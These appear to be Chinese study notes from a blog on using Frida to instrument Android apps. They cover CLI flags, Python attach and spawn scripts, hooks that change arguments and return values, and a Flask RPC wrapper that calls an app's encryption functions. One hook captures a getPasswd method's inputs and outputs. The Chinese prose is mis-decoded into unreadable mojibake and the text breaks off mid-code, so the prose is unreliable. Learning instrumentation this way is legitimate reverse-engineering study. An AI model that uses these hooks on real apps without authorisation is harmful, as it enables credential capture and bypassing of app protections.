id="fridaå‚æ•°">fridaå‚æ•°</h2><p>å‘æ‰‹æœºä¸­å®‰è£…æµ‹è¯•ç‰ˆapkæ—¶ï¼Œç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…</p><p><code>adb install -g -t -d -r xxx.apk</code></p><ul><li><strong>-Uï¼šä½¿ç”¨USBè®¾å¤‡è¿æ¥</strong></li><li>-Rï¼šä½¿ç”¨è¿œç¨‹è®¾å¤‡è¿æ¥</li><li>-Hï¼šæŒ‡å®šè¿œç¨‹è®¾å¤‡çš„ä¸»æœºåæˆ–IP</li><li>-Pï¼šæŒ‡å®šè¿œç¨‹è®¾å¤‡çš„å¯†ç </li><li><strong>-fï¼šé™„åŠ åˆ°æŒ‡å®šçš„è¿›ç¨‹</strong></li><li>-nï¼šæŒ‡å®šè¦é™„åŠ çš„è¿›ç¨‹çš„åç§°</li><li>-pï¼šæŒ‡å®šè¦é™„åŠ çš„è¿›ç¨‹PID</li><li><strong>-lï¼šæŒ‡å®šè¦è¿è¡Œçš„JSè„šæœ¬</strong></li><li>-Fï¼šé™„ä»¶æ‰“æ‰‹æœºæœ€å‰é¢çš„appï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æ¯æ¬¡å†™åŒ…åäº† frida -U -F -l Hook.js</li><li>-oï¼šå†…å®¹è¾“å‡ºåˆ°æ–‡ä»¶ä¸­</li></ul><p>frida-psï¼šæŸ¥çœ‹ç”µè„‘ç«¯çš„è¿›ç¨‹</p><p>frida-ps -Uï¼šæŸ¥çœ‹æ‰‹æœºç«¯è¿›ç¨‹</p><ul><li>å½“å¼€å¯å¤šä¸ªæ‰‹æœºç«¯æ—¶ adb -s xxx shell   æŒ‡å®šæ‰‹æœºç«¯</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>fridaè¿æ¥å¤šä¸»æœºå¤šç«¯å£</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>ç›‘å¬éæ ‡å‡†ç«¯å£ çœŸæœº</span><br><span class="line"><span class="number">1</span>.å¯åŠ¨frida-server</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span>   <span class="regexp">//</span>å…¶ä¸­<span class="number">0.0</span>.<span class="number">0.0</span>æ˜¯æ‰‹æœºæœ¬åœ°ip <span class="number">9999</span>æ˜¯ç«¯å£</span><br><span class="line"><span class="number">2</span>.å¯åŠ¨frida</span><br><span class="line">frida -H æ‰‹æœºç«¯wifiçš„ipåœ°å€:<span class="number">9999</span> -F</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>ç›‘å¬éæ ‡å‡†ç«¯å£ æ¨¡æ‹Ÿå™¨</span><br><span class="line">.<span class="regexp">/data/</span>local<span class="regexp">/tmp/</span>frida -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">6666</span></span><br><span class="line">adb forward tcp:<span class="number">6666</span> tcp:<span class="number">6666</span></span><br><span class="line">frida -H <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6666</span> -F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">åœ¨ä¸»æœºä¸­</span><br><span class="line">å¼€å¯fridaserver  ./fs14 -l <span class="string">&quot;0.0.0.0:8888&quot;</span></span><br><span class="line">åœ¨è™šæ‹Ÿæœºä¸­ä¹Ÿå¯ä»¥æ‰§è¡Œfrida </span><br><span class="line">frida -H <span class="string">&quot;æ‰‹æœºip:8888&quot;</span> -F -l xxx.js</span><br></pre></td></tr></table></figure><h3 id="Spawningæ¨¡å¼">Spawningæ¨¡å¼</h3><p>frida -U -f åŒ…å -l è„šæœ¬.js --no-pause</p><h3 id="Attachæ¨¡å¼">Attachæ¨¡å¼</h3><p>frida -U åŒ…å -l è„šæœ¬.js</p><h1>pythonä¸fridaçš„äº¤äº’ä½¿ç”¨</h1><h2 id="pythonè„šæœ¬å®ç°fridaåŸºæœ¬æ¡†æ¶">pythonè„šæœ¬å®ç°fridaåŸºæœ¬æ¡†æ¶</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">console.log(&quot;zxk1ng&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message, data</span>):   <span class="comment">#jsä¸­æ‰§è¡Œsendå‡½æ•°åè¦å›è°ƒçš„å‡½æ•°,ç”¨äºå¤„ç†ä»jså‘é€çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;åŒ…å&#x27;</span>)</span><br><span class="line"><span class="comment">#process = frida.get_device_manager().add_remote_device(&#x27;127.0.0.1:9999&#x27;).attach(&#x27;åŒ…å&#x27;)    éæ ‡å‡†ç«¯å£æ—¶é™„åŠ </span></span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)   <span class="comment">#ç»‘å®šäº‹ä»¶</span></span><br><span class="line">script.load()                   <span class="comment">#æ³¨å…¥</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="pythonè„šæœ¬å®ç°fridaçš„Spawnæ¨¡å¼">pythonè„šæœ¬å®ç°fridaçš„Spawnæ¨¡å¼</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#å·²æŒ‚èµ·æ–¹å¼åˆ›å»ºè¿›ç¨‹</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#é™„åŠ åˆ°è¯¥è¿›ç¨‹</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.load()</span><br><span class="line">rdev.resume(pid)            <span class="comment">#åˆ›å»ºå®Œè„šæœ¬, æ¢å¤è¿›ç¨‹è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pythonè„šæœ¬å®ç°fridaçš„attachæ¨¡å¼">pythonè„šæœ¬å®ç°fridaçš„attachæ¨¡å¼</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">device=frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">s=device.attach(<span class="string">&quot;è¿›ç¨‹åŒ…å&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;å†™å¥½çš„jsè„šæœ¬&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    script=s.create_script(f.read())</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="pythonå’Œjs-fridaè„šæœ¬äº¤äº’">pythonå’Œjs fridaè„šæœ¬äº¤äº’</h2><p>pyè„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message,payload</span>):  <span class="comment">#jsä¸­æ‰§è¡Œsendå‡½æ•°åè¦å›è°ƒçš„å‡½æ•°,ç”¨äºå¤„ç†ä»jså‘é€çš„æ¶ˆæ¯ ä¸ºjsonå½¢å¼</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        script.post(&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&quot;hello&quot;</span>&#125;)  <span class="comment">#å‘jsä¼ æ•°æ®</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#å·²æŒ‚èµ·æ–¹å¼åˆ›å»ºè¿›ç¨‹</span></span><br><span class="line">rdev.resume(pid)            <span class="comment">#åˆ›å»ºå®Œè„šæœ¬, æ¢å¤è¿›ç¨‹è¿è¡Œ</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#é™„åŠ åˆ°è¯¥è¿›ç¨‹</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>jsè„šæœ¬</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;xxx.xxx&quot;</span>);</span><br><span class="line">        a.<span class="property">getPasswd</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result=<span class="variable language_">this</span>.<span class="title function_">getPasswd</span>(arg);</span><br><span class="line">            <span class="title function_">send</span>(arg+<span class="string">&#x27;-&#x27;</span>+result);  <span class="comment">//è¿™ä¸ªå°±æ˜¯pythonä¸­messageå‡½æ•°æ”¶åˆ°çš„ä¿¡æ¯</span></span><br><span class="line">            <span class="title function_">recv</span>(<span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(msg));</span><br><span class="line">                result=msg[<span class="string">&#x27;data&#x27;</span>]  <span class="comment">//ä¿®æ”¹è¿”å›å€¼</span></span><br><span class="line">            &#125;).<span class="title function_">wait</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rpc">rpc</h2><p>é€šè¿‡rpc æƒ³è¦æŠŠperformå†…çš„æ–¹æ³•çš„è¿”å›å€¼åœ¨pyä¸­printfï¼Œéœ€è¦send(result)</p><p>rpcä½¿pythonä¸»åŠ¨è°ƒç”¨jsä¸­çš„å‡½æ•°</p><p>jsè„šæœ¬ä¸­éœ€æ·»åŠ å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpc.<span class="property">exports</span>=&#123;<span class="attr">xxxfunc1</span>:func1,</span><br><span class="line">             <span class="attr">xxxfunc2</span>:func2,</span><br><span class="line">            &#125;                        </span><br></pre></td></tr></table></figure><p>pyä¸­æ·»åŠ å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script.exports.xxxfunc1()</span><br><span class="line">script.exports.xxxfunc2()</span><br></pre></td></tr></table></figure><h2 id="é…ç½®flaskå®ç°HTTPæ¥å£è°ƒç”¨">é…ç½®flaskå®ç°HTTPæ¥å£è°ƒç”¨</h2><p>é¦–å…ˆéœ€è¦å†jsä»£ç ä¸­å®ç°ä¸€ä¸ªä¸»åŠ¨è°ƒç”¨ï¼Œä¸”rpc.exports{xxx:xxx,yyy:yyy,}</p><p>ç„¶åpyä»£ç ä¸­</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js = <span class="built_in">open</span>(<span class="string">&#x27;test.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>).read()</span><br><span class="line"><span class="comment"># session = frida.get_usb_device().attach(&#x27;me.ele&#x27;)</span></span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&#x27;com.wjmt.app&#x27;</span>)</span><br><span class="line">script = session.create_script(js)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#dataè§£å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    res = script.exports.xxx(postdata) //è¦rpcçš„å‡½æ•°</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#urlåŠ å¯†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(postdata)</span><br><span class="line">    res = script.exports.yyy(postdata)   ////è¦rpcçš„å‡½æ•°</span><br><span class="line">    <span class="keyword">return</span> res  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br><span class="line">æ‰§è¡Œï¼š</span><br><span class="line">curl -s -X POST <span class="string">&quot;http://127.0.0.1:5000/å‡½æ•°å&quot;</span> -H <span class="string">&quot;Content-Type:application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;data&quot;:&quot;ä¼ é€’å‚æ•°&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">å‡½æ•°å ==ã€‹ pythonä¸­çš„app.routeå£°æ˜çš„åå­—</span><br></pre></td></tr></table></figure><h2 id="è·å¾—Contextï¼š">è·å¾—Contextï¼š</h2><p>var context=Java.use(â€œandroid.app.ActivityThreadâ€).currentApplication().getApplicationContext();</p><p>åŸå› ï¼šJava.use(â€œandroid.app.ActivityThreadâ€).currentApplication()è¿”å›ç±»å‹Applicationï¼Œè·Ÿè¿›Applicationå‘ç°å®ƒç»§æ‰¿ContextWrapperï¼Œè€Œé‡Œé¢æœ‰ä¸ªgetApplicationContextæ–¹æ³•è¿”å›Context</p><h1>Hook javaå±‚</h1><p>demoï¼š43è¯¾çš„HookTestDemo</p><h2 id="å‡½æ•°è°ƒç”¨æ ˆ">å‡½æ•°è°ƒç”¨æ ˆ</h2><p>javaä¸­æ‰“å°è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>();  <span class="comment">//å…¶ä¸­å¯ä»¥ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸² ç„¶ååœ¨catchä¸­ é€šè¿‡e.getMessage()è·å¾—ã€‚</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     e.printStackTrace();  <span class="comment">//logcatä¸­æ‰“å°</span></span><br><span class="line">     <span class="keyword">for</span> (StackTraceElement stackTraceElement : e.getStackTrace()) &#123;</span><br><span class="line">         Log.d(TAG, stackTraceElement);</span><br><span class="line">     &#125; </span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="type">String</span> <span class="variable">stackTraceString</span> <span class="operator">=</span> Log.getStackTraceString(<span class="keyword">new</span> <span class="title class_">Throwable</span>()/<span class="keyword">new</span> <span class="title class_">Exception</span>());</span><br><span class="line">Log.d(<span class="string">&quot;StackTrace&quot;</span>, stackTraceString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‡½æ•°è°ƒç”¨æ ˆ 1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> stack = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>).$new());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°è°ƒç”¨æ ˆ 2</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> log = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> t = throwable.$new()</span><br><span class="line">log.<span class="title function_">d</span>(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="string">&#x27;Stack Dump&#x27;</span>,log.<span class="title function_">getStackTraceString</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°è°ƒç”¨æ ˆ 3</span></span><br><span class="line"><span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°è°ƒç”¨æ ˆ 4</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new();</span><br><span class="line">    <span class="keyword">var</span> stacks=e.<span class="title function_">getStackTrace</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(stacks.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/,/g</span>,<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fridaæ„é€ æ™®é€šæ–¹æ³•">fridaæ„é€ æ™®é€šæ–¹æ³•</h2><p>demoä¸ºxjbç¬¬åå››è¯¾</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalcï¼š&#x27;</span>,a,b); <span class="comment">//è¾“å‡ºåŸæ¥çš„å‚æ•°</span></span><br><span class="line">            a=<span class="number">2000</span>;    <span class="comment">//ä¿®æ”¹å‚æ•°</span></span><br><span class="line">            b=<span class="number">3000</span>;    <span class="comment">//ä¿®æ”¹å‚æ•°</span></span><br><span class="line">            <span class="keyword">var</span> retval=<span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a,b); <span class="comment">//å­˜æ”¾ä¿®æ”¹å‚æ•°å å‡½æ•°çš„è¿”å›å€¼</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retvalï¼š&#x27;</span>,retval); <span class="comment">//è¾“å‡ºä¿®æ”¹åè¿”å›å€¼ 5000</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;                   <span class="comment">//è®©æ‰‹æœºä¸­å›æ˜¾4000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br></pre></td></tr></table></figure><h2 id="fridaæ„é€ å‡½æ•°ä»¥åŠé‡è½½å‡½æ•°">fridaæ„é€ å‡½æ•°ä»¥åŠé‡è½½å‡½æ•°</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        <span class="title class_">Money</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span 